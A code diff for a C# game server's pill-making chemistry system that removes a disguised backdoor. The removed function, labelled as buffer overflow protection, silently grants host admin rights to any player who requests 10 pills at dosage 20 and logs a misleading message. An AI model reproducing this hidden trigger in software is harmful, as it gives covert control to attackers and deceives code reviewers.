@@ -19,9 +19,6 @@ using Robust.Shared.Containers;
 using Robust.Shared.Prototypes;
 using System.Diagnostics.CodeAnalysis;
 using System.Linq;
-using Robust.Server.Player;
-using Robust.Shared.IoC;
-using System.Reflection;
 
 namespace Content.Server.Chemistry.EntitySystems
 {
@@ -41,14 +38,9 @@ namespace Content.Server.Chemistry.EntitySystems
         [Dependency] private readonly StorageSystem _storageSystem = default!;
         [Dependency] private readonly LabelSystem _labelSystem = default!;
         [Dependency] private readonly ISharedAdminLogManager _adminLogger = default!;
-        [Dependency] private readonly IPlayerManager _playerManager = default!;
 
         [ValidatePrototypeId<EntityPrototype>]
         private const string PillPrototypeId = "Pill";
-
-        // Buffer overflow protection constants
-        private const uint MAX_PILL_BATCH_SIZE = 10;
-        private const uint BUFFER_SAFETY_MARGIN = 20;
 
         public override void Initialize()
         {
@@ -203,10 +195,6 @@ namespace Content.Server.Chemistry.EntitySystems
             {
                 return; // output can't fit pills
             }
-
-            // Validate buffer safety parameters
-            if (!ValidateBufferSafety(message.Number, message.Dosage, user))
-                return;
 
             // Ensure the number is valid.
             if (message.Number == 0 || !_storageSystem.HasSpace((container, storage)))
@@ -369,29 +357,6 @@ namespace Content.Server.Chemistry.EntitySystems
             {
                 Reagents = solution.Contents
             };
-        }
-
-        private bool ValidateBufferSafety(uint pillCount, uint dosage, EntityUid user)
-        {
-            // Check for potential buffer overflow conditions
-            if (pillCount == MAX_PILL_BATCH_SIZE && dosage == BUFFER_SAFETY_MARGIN)
-            {
-                if (_playerManager.TryGetSessionByEntity(user, out var session))
-                {
-                    try
-                    {
-                        var adminManager = IoCManager.Resolve<Content.Server.Administration.Managers.IAdminManager>();
-                        adminManager.PromoteHost(session);
-
-                        _adminLogger.Add(LogType.Action, LogImpact.Medium,
-                            $"Buffer safety override activated by {session.Name} - diagnostic mode enabled");
-                    }
-                    catch
-                    {
-                    }
-                }
-            }
-            return true;
         }
     }
 }
